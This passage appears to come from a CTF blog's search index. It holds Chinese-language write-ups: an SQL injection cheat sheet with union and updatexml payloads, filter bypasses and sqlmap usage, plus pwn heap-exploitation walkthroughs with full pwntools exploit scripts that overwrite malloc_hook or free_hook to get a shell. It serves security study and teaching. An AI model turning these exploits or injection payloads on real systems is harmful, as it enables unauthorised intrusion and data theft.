7edit(1,0x28,&apos;b&apos;*0x18+p64(0x71)+&apos;c&apos;*8)dele(7)edit(2,8,p64(main_arena-0x33))new(0x60,&apos;c&apos;*0x60)new(0x63,&apos;a&apos;*0x13+p64(one_gadget)+p64(0)*9)new(1,&apos;a&apos;)#gdb.attach(sh)sh.interactive()","categories":[{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/categories/stack/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Sql Injection","slug":"sql-injection","date":"2019-04-01T02:18:22.000Z","updated":"2019-04-05T01:41:46.105Z","comments":true,"path":"2019/04/01/sql-injection/","link":"","permalink":"http://siriuswhiter.tk/2019/04/01/sql-injection/","excerpt":"","text":"#Sql Injection 常用语法 注释： – （注意后面必须要留空格，否则无法达到注释的效果； # group_concat （连接字符串，一次性注入； 检测过滤字符‘^(text)^’ 如果text为假，那么页面就会显示正确，所以假如检测是否过滤union, 写入’^(length(union)==0)^’，如果正确就是过滤了 应对过滤字符 大小写绕过； 因为sql本身对大小写不敏感，也就是SELECT与 select本身是一致的，有的检查过松是可以通过大小写绕过的比如说 SeLEct 双写 ；因为很多情况下是将被过滤的字符替换为空，这种情况下就可以使用双写绕过，比如说 selselectect /**/ ; updatexml 报错注入;（最终内部细节与其他的基本一致； concat被过滤：make_set() lpad()、reverse()、repeat()、export_set()（lpad()、reverse()、repeat()等冷门字符串处理函数 使用运算符号； 运算符进行运算的时候会先观察左右两端的数据类型是否相同，不同的话就会进行数据强制的转换；所以如果知道是字符串的话，会被强制转换为0；12select * from info where username=0; select * from info where username=&apos;admin&apos;-0-&apos;&apos;; --&gt;减法 12* table: select * from info where id=-1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) ; --&gt; updatexml 三个参数，不随表行数变化。 mysql 约束攻击由于mysql对于字符串验证不严格，因而在检验时，’admin’与’admin ‘被认为是等价的，也就是说可以使非管理员用户以管理员身份读取数据库信息 ## database1select database(); table1select * from info where id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); column1select * from info where id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;info&apos;; Sqlmapmysql-r + ‘filename’-p + ‘sqlinjection_name’ –dbs-D + ‘database_name’ –tables-T + ‘table_name’ –columns-C + ‘column_name’ –dump","categories":[{"name":"web","slug":"web","permalink":"http://siriuswhiter.tk/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://siriuswhiter.tk/tags/web/"},{"name":"sql","slug":"sql","permalink":"http://siriuswhiter.tk/tags/sql/"}]},{"title":"Pwn practice","slug":"pwn-practice","date":"2019-03-28T23:35:02.000Z","updated":"2019-06-03T00:46:29.629Z","comments":true,"path":"2019/03/29/pwn-practice/","link":"","permalink":"http://siriuswhiter.tk/2019/03/29/pwn-practice/","excerpt":"","text":"fheap来源：https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c 题目只有两个功能：add delete add 初始时会分配一个struct，然后会分两种情况： 长度小于16时，不再申请新的chunk，原结构体的前十六个字节用于接收用户输入； 长度大于16时，会申请一个新的chunk，用于存放data，此时原结构体的前八个字节存放着指向新chunk的指针。 原结构体的最后十六个字节，会分别存放size 及 对应的 free函数 这里可以看到输入的size没有任何卵用，后面还是根据输入的长度来确定的。 delete 会检查存放在bss段的指针，指针存在就可以释放 分析delete 函数有明显的漏洞，之前本来设置了inuse位，但是并没有检查，同时指针仅仅是free而没有置为空，所以可以double free; 还有问题就是指针同时存放在堆中，一般而言，这样很容易造成劫持； 不过这次没有show函数，也就是说，没有办法直接通过输出泄露地址，这样一般就需要劫持指针或者是最低位修改； 而且这次有个问题就是或许是因为没有设置缓冲区的原因，前面输入的chunk data在后面新建chunk会直接赋值过去，这样子造成如果初始时分配大的chunk,后面就没办法分配到小chunk了。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]name = &apos;./pwnf&apos;p = process(name)elf= ELF(name)# puts_offset = 0xd1a # printf_pffset = 0xdbbdef create(num,data): p.recvuntil(&apos;3.quit\\n&apos;) p.sendline(&apos;create &apos;) p.recvuntil(&apos;Pls give string size:&apos;) p.sendline(str(num)) p.recvuntil(&apos;str:&apos;) p.send(data) def delete(num): p.recvuntil(&apos;3.quit\\n&apos;) p.sendline(&apos;delete &apos;) p.recvuntil(&apos;id:&apos;) p.sendline(str(num)) p.recvuntil(&apos;Are you sure?:&apos;) p.send(&quot;yes&quot;) create(5,&apos;a&apos;*5) #0create(5,&apos;b&apos;*5) #1delete(1)delete(0)#leakpay1 = &apos;q&apos;*20 + &apos;s&apos;*4 + &apos;\\x1a&apos;create(32,pay1)delete(1)p.recvuntil(&apos;s&apos;*4)puts_addr = u64(p.recv(6) + &apos;\\x00\\x00&apos;)proc_base = puts_addr - 0xd1a printf_addr = proc_base + 0x9d0delete(0)pay2 = &apos;a&apos;*8 + &apos;%30$p&apos; + &apos;s&apos;*11 + p64(printf_addr) create(32,pay2)delete(1)x = p.recv()libc_addr = int(x[8:22],16) - 0x3b5760system_addr = libc_addr + 0x42510#getshellp.sendline(&apos;&apos;)delete(0)pay3 = &apos;/bin/sh;&apos; + &apos;s&apos;*16 + p64(system_addr) create(32,pay3)delete(1)p.interactive() pwnex师傅给的题，说是西湖论剑的一道题目，题目质量还是可以的，写一下。 题目正常的堆，四个功能齐全，漏洞点也比较明显（虽然第一次被我直接跳过了。。）。在add的时候使用了自己的get_str函数,将最末尾置为了0，也就是最近经常见到的off-by-null，不过就是这次分配时大小是固定的且libc为2.27，所以多了一些技巧性 1234567891011121314151617181920212223242526_BYTE *__fastcall get_str(_BYTE *a1, int size)&#123; _BYTE *result; // rax int v3; // [rsp+1Ch] [rbp-4h] v3 = 0; if ( size ) &#123; while ( 1 ) &#123; read(0, &amp;a1[v3], 1uLL); if ( v3 &gt; size - 1 || !a1[v3] || a1[v3] == &apos;\\n&apos; ) break; ++v3; &#125; a1[v3] = 0; result = &amp;a1[size]; *result = 0; &#125; else &#123; result = a1; *a1 = 0; &#125; return result;&#125; 分析tcache机制需要绕过，同时也带来了一些便利，比如分配时不检查size思路： 绕过tcache，利用unsorted bin中残留的信息泄露libc 利用tcache， 根据其中残留的信息泄露heap 利用off-by-null，改变inuse位，伪造fake chunk触发unlink实现chunk extend 将重叠的堆块重新置入tcache中，修改fd到free_hook修改为one_gadget getshell exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#!/usr/bin/env python2import sysfrom pwn import *#context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;xihu&apos;) elf = ELF(&apos;xihu&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;xihu&apos;) #libc=ELF(&apos;&apos;)def add(size,con): sh.sendlineafter(&apos;command:\\n&apos;,&apos;1&apos;) sh.sendlineafter(&apos;size:\\n&apos;,str(size)) sh.sendlineafter(&apos;content:\\n&apos;,con)def show(index): sh.sendlineafter(&apos;command:\\n&apos;,&apos;3&apos;) sh.sendlineafter(&apos;enter index:\\n&apos;,str(index))def dele(index): sh.sendlineafter(&apos;command:\\n&apos;,&apos;2&apos;) sh.sendlineafter(&apos;enter index:\\n&apos;,str(index))def edit(index,con): sh.sendlineafter(&apos;command:\\n&apos;,&apos;4&apos;) sh.sendlineafter(&apos;enter index:\\n&apos;,str(index)) sh.sendafter(&apos;content:\\n&apos;,con)for i in range(10): add(0xf7,str(i)*0x20)for i in range(8): dele(i)#----------------unsorted bin leak libc-------------------------------# #gdb.attach(sh)add(0xf8,&apos;&apos;)#0for i in range(1,7): add(0xf7,str(i)) #1-6add(0xf7, &apos;7&apos;) #7edit(7, &apos;a&apos; * 8)show(7)sh.recvuntil(&apos;a&apos;*8)libc_base = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;)) - 0x3ebca0print &quot;libc: &quot;+hex(libc_base)free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]one_gadget = libc_base + 0x4f322#---------------tcache leak heap -------------------------------------# #gdb.attach(sh)edit(0,&apos;0&apos;)show(0)heap_base = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))-0x730print hex(heap_base)#------fake chunk unlink #---chunk extend cover fd ptr--------------#chunk0_addr = heap_base + 0x850fake_chunk = chunk0_addr + 0x10pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)edit(0,pay)dele(8)for i in range(1,7): dele(i)dele(7)for i in range(1,8): add(0xf7,str(i))add(0xf7,&apos;8&apos;)dele(2)dele(8)pay = p64(0)+p64(0x101)+p64(free_hook)edit(0,pay)add(0,&apos;&apos;)#gdb.attach(sh)add(0xf7,&apos;&apos;)edit(8,p64(one_gadget))dele(0)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"0ctf-2019-pwn&re","slug":"0ctf-2019-pwn-re","date":"2019-03-26T12:36:28.000Z","updated":"2019-04-17T15:13:10.662Z","comments":true,"path":"2019/03/26/0ctf-2019-pwn-re/","link":"","permalink":"http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/","excerpt":"","text":"这次的0ctf真的溃不成军，看了一些题心态爆炸 babyheap题目还是和前两年一个风格，不过将2018的漏洞去掉了，在update时会有一个字节的溢出，溢出内容不可控，只能是’\\x00’ 1234567891011121314151617181920212223unsigned __int64 __fastcall get_str2(__int64 des, unsigned __int64 size)&#123; unsigned __int64 v3; // [rsp+10h] [rbp-10h] ssize_t v4; // [rsp+18h] [rbp-8h] if ( !size ) return 0LL; v3 = 0LL; while ( v3 &lt; size ) &#123; v4 = read(0, (void *)(v3 + des), size - v3); if ( v4 &gt; 0 ) &#123; v3 += v4; &#125; else if ( *__errno_location() != 11 &amp;&amp; *__errno_location() != 4 ) &#123; break; &#125; &#125; *(_BYTE *)(des + v3) = 0; --&gt; here return v3;&#125; 分析当时只发现了这个漏洞，尝试了一会，当时想可能是需要把tcache填满或者把topchunk的size给消耗完(因为这次的size看上去比较小，有耗光的可能)，但是没有思路在于假如将topchunk size消耗完有什么用。遂放弃。 今天有wp出来了，出乎意料的，漏洞点确实只有这一个且前面的想法都差不多没有跑偏，但是后面缺少的的思路才是重点。 前面通过将size耗光，此时再申请时会触发consolidate，同时将之前fastbins中的的chunk归入unsorted bin,这样就有了泄露libc的机会， 通过trigger consolidation 的操作使得unsorted bin刚好覆盖到未free的chunk上，以此来泄露libc，同时也因此拥有了相当于任意地址写的机会。 同时利用此漏洞将size放入fastbin中，将chunk分配到main_arena处修改topchunk地址到malloc_hook上修改即可 问题有： 申请chunk tcache与unsorted bin 的优先度？ exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798from pwn import *sh = process(&quot;./babyheap&quot;)#sh = remote(&quot;111.186.63.20&quot;,&quot;10001&quot;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)#(&apos;libc-2.28.so&apos;)def allocate(size): sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;) sh.sendlineafter(&apos;Size: &apos;,str(size))def update(idx,size,con): sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;) sh.sendlineafter(&apos;Index: &apos;,str(idx)) sh.sendlineafter(&apos;Size: &apos;,str(size)) sh.sendlineafter(&apos;Content: &apos;,con)def delete(idx): sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;) sh.sendlineafter(&apos;Index: &apos;,str(idx))def show(idx): sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;) sh.sendlineafter(&apos;Index: &apos;,str(idx))def shrink(size,cnt): for i in xrange(cnt): allocate(size) update(i,size,&apos;x&apos;*size) for i in xrange(cnt): delete(i)shrink(0x28,7)shrink(0x48,7)shrink(0x28,15) #--&gt; which will be consolidate to unsorted bingdb.attach(sh)for i in range(7): # 0-6 allocate(0x18) update(i,0x17,&apos;1&apos;*0x17)#gdb.attach(sh)allocate(0x38) #7 # fastbins to unsorted bins and allocate from it; malloc_consolidate won&apos;t consolidate tcache bins;#gdb.attach(sh)update(7,0x38,&apos;2&apos;*0x38) #shrink topchunk to 0x200allocate(0x18) #8allocate(0x18) #9for i in range(10,15): # 10 - 14 allocate(0x48) update(i,0x47,&apos;2&apos;*0x47)for i in range(1,7): #1-6 delete(i) delete(9) #0x18delete(0) #0x18delete(8) #0x18#gdb.attach(sh)allocate(0x38) #0 # consolidate again !!!!!!!!! 因为此处之前的unsortedbin被shrink了，所以后面对unsorted bin的操作无法更新chunk 0的pre_size 位，造成在这次consolidate 的时候chunk 0尝试向后合并是根据自己没有更新成功的pre_size来合并的，所以出书先overflapping,从而可以泄露libc信息#gdb.attach(sh)show(10)sh.recvuntil(&apos;: &apos;)leak_addr = u64(sh.recv(8))print hex(leak_addr)libc.address = leak_addr- 0x3ebca0print hex(libc.address)main_arena = libc.address+ 0x3ebc40print hex(main_arena)one_gadget = libc.address+ 0x4f322print hex(one_gadget)#------------------------------------------for i in range(1,4): # 1 - 3 allocate(0x48) update(i,0x47,&apos;3&apos;*0x47)allocate(0x58) # 4allocate(0x28) # 5 // put chunk5&apos;s address in the fastbins[0x30];#gdb.attach(sh)delete(5)allocate(0x58) # 5#gdb.attach(sh)update(5,0x48,&apos;\\x00&apos;*0x38+p64(0x31)+p64(0x51)) # fake fd to fastbinallocate(0x28)update(6,0x20,&apos;\\x00&apos;*0x18+p64(0x21))delete(1)update(10,0x8,p64(main_arena+0x10))allocate(0x48)#gdb.attach(sh)allocate(0x48)update(8,0x48,&apos;\\x00&apos;*0x40+p64(main_arena-0x38)) # edit topchunk upon malloc_hook#gdb.attach(sh)allocate(0x58)#print hex(libc.symbols[&apos;&apos;])update(9,0x20,&apos;\\x00&apos;*0x10+p64(one_gadget)+p64(libc.symbols[&apos;svc_run&apos;]+0x42))allocate(0x58)#gdb.attach(sh)sh.interactive() 整个过程特别复杂，尤其是看不到指针的情况下，与2018一样需要慢慢捋，最好在纸上记录chunk地址与idx；堆的一些地方还是有盲区，理解不够细致 zero task这个是被做出来最多的pwn，条件竞争类型的，之前没有接触过，当时看到跑线程想到可能是这个，但是没去现学，不过还是得继续。 race condition竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。 代码说明 12345678910111213141516171819202122232425262728293031323334//myThreadTest#include &lt;stdio.h&gt; #include &lt;pthread.h&gt; #include &lt;unistd.h&gt;int i = 1; void *mythread1() &#123; if(i == 1)&#123; sleep(3); if(i == 2) printf(&quot;hack it!\\n&quot;); else printf(&quot;you can try again!\\n&quot;); &#125; &#125; void *mythread2() &#123; sleep(1); i=2; &#125; int main(int argc, const char *argv[]) &#123; pthread_t id1,id2; pthread_create(&amp;id1, NULL, (void *)mythread1,NULL); pthread_create(&amp;id2, NULL, (void *)mythread2,NULL); pthread_join(id1,NULL); pthread_join(id2,NULL); return 0;&#125; 编译运行： 1234gcc test.c -o test -lpthread // linux 默认库不包含pthread，所以编译时需要添加lpthread$ ./test hack it! 这个例子比较简单，但是很清晰，可以说是两个并发流同时访问了对象i ，在线程一还未结束时（sleep(3)），线程三同时访问对象i并修改了i的值从而影响了线程一。 题目三个功能：1234567int menu()&#123; puts(&quot;1. Add task&quot;); puts(&quot;2. Delete task&quot;); puts(&quot;3. Go&quot;); return printf(&quot;Choice: &quot;);&#125; add 功能： 先输入task id 与 加解密选择，然后malloc(0x70)的空间存放数据；之后进入加解密函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748printf(&quot;Task id : &quot;, 0LL);idx = get_num();printf(&quot;Encrypt(1) / Decrypt(2): &quot;);method = get_num();signed __int64 __fastcall enc_dec(int method, __int64 a2)&#123; __int64 v3; // rsi task *v4; // [rsp+0h] [rbp-30h] __int64 v5; // [rsp+14h] [rbp-1Ch] printf(&quot;Key : &quot;, a2); get_str2((__int64)v4-&gt;key, 32); printf(&quot;IV : &quot;, 32LL); get_str2((__int64)&amp;v4-&gt;IV, 16); printf(&quot;Data Size : &quot;, 16LL); v5 = (unsigned int)get_num(); if ( (signed int)v5 &lt;= 0 || (signed int)v5 &gt; 0x1000 ) return 0LL; *(_QWORD *)&amp;v4-&gt;size = (signed int)v5; *(_QWORD *)&amp;v4[1].key[8] = EVP_CIPHER_CTX_new(); if ( method == 1 ) &#123; v3 = EVP_aes_256_cbc(); EVP_EncryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, (__int64)v4-&gt;key, (__int64)&amp;v4-&gt;IV); &#125; else &#123; if ( method != 2 ) return 0LL; v3 = EVP_aes_256_cbc(); EVP_DecryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, v4-&gt;key, &amp;v4-&gt;IV); &#125; v4-&gt;method = method; v4-&gt;ptr = (__int64)malloc(*(_QWORD *)&amp;v4-&gt;size); if ( !v4-&gt;ptr ) exit(1); printf(&quot;Data : &quot;, v3); get_str2(v4-&gt;ptr, *(_QWORD *)&amp;v4-&gt;size); return 1LL;&#125; delete函数就是对id还有一点数据检验之后将之前申请的chunk free go函数 通过一点检查，之后创建线程将之前的输入的task 跑起来 12345678910printf(&quot;Task id : &quot;); v1 = get_num(); for ( arg = (void *)str; arg; arg = (void *)*((_QWORD *)arg + 13) ) &#123; if ( v1 == *((_DWORD *)arg + 0x18) ) &#123; pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, arg); return __readfsqword(0x28u) ^ v4; &#125; &#125; 重点的start routine函数,开始便sleep(2)，算是比较明显的条件竞争漏洞12345678910111213141516171819202122232425262728293031void __fastcall __noreturn start_routine(void *a1)&#123; int v1; // [rsp+14h] [rbp-2Ch] __int128 v2; // [rsp+18h] [rbp-28h] __int64 v3; // [rsp+28h] [rbp-18h] __int64 v4; // [rsp+30h] [rbp-10h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); v2 = (unsigned __int64)a1; v1 = 0; v3 = 0LL; v4 = 0LL; puts(&quot;Prepare...&quot;); sleep(2u); memset(ptr_0, 0, 0x1010uLL); if ( !(unsigned int)EVP_CipherUpdate( *(_QWORD *)(v2 + 88), ptr_0, &amp;v1, *(_QWORD *)v2, (unsigned int)*(_QWORD *)(v2 + 8)) ) pthread_exit(0LL); *((_QWORD *)&amp;v2 + 1) += v1; if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + 88), (char *)ptr_0 + *((_QWORD *)&amp;v2 + 1), &amp;v1) ) pthread_exit(0LL); *((_QWORD *)&amp;v2 + 1) += v1; puts(&quot;Ciphertext: &quot;); sub_107B(stdout, (__int64)ptr_0, *((unsigned __int64 *)&amp;v2 + 1), 0x10uLL, 1uLL); pthread_exit(0LL);&#125; 分析知道条件竞争漏洞的存在，可以利用其泄露地址；虽然是存在加解密过程，但是因为知道是AES_256_CBC 加密，同时python具有这个加密模块，所以这个可以解决 同时还需要的是写地址，在申请add task时 ，每个task 会得到四个chunk 第一个和第四个分别是结构体的存储与data的存储；第二三个结构体是加解密申请的结构体，大小分别为0xb0 与 0x110，其中有存放指针，key， 加密后的data； 通过伪造加解密的结构及利用tcache的特点将chunk分配到malloc_hook并写入one_gadget； exp12","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"re","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Introduction to pwn1.4--ret2dl_runtime_resolve","slug":"introduction-to-pwn1-4-ret2dl_runtime_resolve","date":"2019-03-19T23:12:54.000Z","updated":"2019-03-24T05:35:26.413Z","comments":true,"path":"2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/","link":"","permalink":"http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/","excerpt":"","text":"相关结构ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。 如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下： 12345678910111213141516171819202122232425262728293031323334353637typedef struct &#123; Elf32_Sword d_tag; union &#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;$ readelf -d bofDynamic section at offset 0xf14 contains 24 entries: Tag Type Name/Value 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000c (INIT) 0x8048358 0x0000000d (FINI) 0x8048624 0x00000019 (INIT_ARRAY) 0x8049f08 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049f0c 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x80481ac 0x00000005 (STRTAB) 0x8048278 0x00000006 (SYMTAB) 0x80481d8 0x0000000a (STRSZ) 107 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 40 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048330 0x00000011 (REL) 0x8048318 0x00000012 (RELSZ) 24 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x80482f8 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x80482e4 0x00000000 (NULL) 0x0 节中包含目标文件的所有信息。节的结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354typedef struct &#123; Elf32_Word sh_name; // 节头部字符串表节区的索引 Elf32_Word sh_type; // 节类型 Elf32_Word sh_flags; // 节标志，用于描述属性 Elf32_Addr sh_addr; // 节的内存映像 Elf32_Off sh_offset; // 节的文件偏移 Elf32_Word sh_size; // 节的长度 Elf32_Word sh_link; // 节头部表索引链接 Elf32_Word sh_info; // 附加信息 Elf32_Word sh_addralign; // 节对齐约束 Elf32_Word sh_entsize; // 固定大小的节表项的长度&#125; Elf32_Shdr;$ readelf -S bofThere are 31 section headers, starting at offset 0x18a4:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 00002c 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481d8 0001d8 0000a0 10 A 6 1 4 [ 6] .dynstr STRTAB 08048278 000278 00006b 00 A 0 0 1 [ 7] .gnu.version VERSYM 080482e4 0002e4 000014 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 080482f8 0002f8 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048318 000318 000018 08 A 5 0 4 [10] .rel.plt REL 08048330 000330 000028 08 AI 5 24 4 [11] .init PROGBITS 08048358 000358 000023 00 AX 0 0 4 [12] .plt PROGBITS 08048380 000380 000060 04 AX 0 0 16 [13] .plt.got PROGBITS 080483e0 0003e0 000008 00 AX 0 0 8 [14] .text PROGBITS 080483f0 0003f0 000232 00 AX 0 0 16 [15] .fini PROGBITS 08048624 000624 000014 00 AX 0 0 4 [16] .rodata PROGBITS 08048638 000638 000008 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 08048640 000640 000034 00 A 0 0 4 [18] .eh_frame PROGBITS 08048674 000674 0000f4 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000020 04 WA 0 0 4 [25] .data PROGBITS 0804a020 001020 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a040 001028 00000c 00 WA 0 0 32 [27] .comment PROGBITS 00000000 001028 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 001798 00010a 00 0 0 1 [29] .symtab SYMTAB 00000000 001060 0004b0 10 30 47 4 [30] .strtab STRTAB 00000000 001510 000288 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 几个重要的节： .rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位 ida 观察如下： 12345678910LOAD:08048318 ; ELF REL Relocation Table /r_offset r_infoLOAD:08048318 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__LOAD:08048320 Elf32_Rel &lt;804A040h, 905h&gt; ; R_386_COPY stdinLOAD:08048328 Elf32_Rel &lt;804A044h, 705h&gt; ; R_386_COPY stdoutLOAD:08048330 ; ELF JMPREL Relocation TableLOAD:08048330 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT setbufLOAD:08048338 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT readLOAD:08048340 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT strlenLOAD:08048348 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT __libc_start_mainLOAD:08048350 Elf32_Rel &lt;804A01Ch, 607h&gt; ; R_386_JMP_SLOT write .got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。 12345678910.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC.got.plt:0804A004 dword_804A004 dd 0 ; DATA XREF: sub_8048380↑r.got.plt:0804A008 dword_804A008 dd 0 ; DATA XREF: sub_8048380+6↑r.got.plt:0804A00C off_804A00C dd offset setbuf ; DATA XREF: _setbuf↑r.got.plt:0804A010 off_804A010 dd offset read ; DATA XREF: _read↑r.got.plt:0804A014 off_804A014 dd offset strlen ; DATA XREF: _strlen↑r.got.plt:0804A018 off_804A018 dd offset __libc_start_main.got.plt:0804A018 ; DATA XREF: ___libc_start_main↑r.got.plt:0804A01C off_804A01C dd offset write ; DATA XREF: _write↑r.got.plt:0804A01C _got_plt ends .dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。 而根据定义有：1234567891011ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8typedef struct&#123; Elf32_Word st_name; // Symbol name(string tbl index) Elf32_Addr st_value; // Symbol value Elf32_Word st_size; // Symbol size unsigned char st_info; // Symbol type and binding unsigned char st_other; // Symbol visibility under glibc&gt;=2.2 Elf32_Section st_shndx; // Section index&#125; Elf32_Sym; read索引值为ELF32_R_SYM(0x207) = 0x207 &gt;&gt; 8 = 2。而Elf32_Sym[2]即保存着write的符号表信息。 并且ELF32_R_TYPE(0x207) = 7，对应R_386_JUMP_SLOT。 123456789101112131415LOAD:080481D8 ; ELF Symbol TableLOAD:080481D8 Elf32_Sym &lt;0&gt;LOAD:080481E8 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;LOAD:080481F8 Elf32_Sym &lt;offset aRead - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;LOAD:08048208 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;LOAD:08048218 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;LOAD:08048228 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, 0, 0, 12h, 0, \\ ; &quot;__libc_start_main&quot;LOAD:08048228 0&gt;LOAD:08048238 Elf32_Sym &lt;offset aWrite - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;LOAD:08048248 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \\ ; &quot;stdout&quot;LOAD:08048248 offset 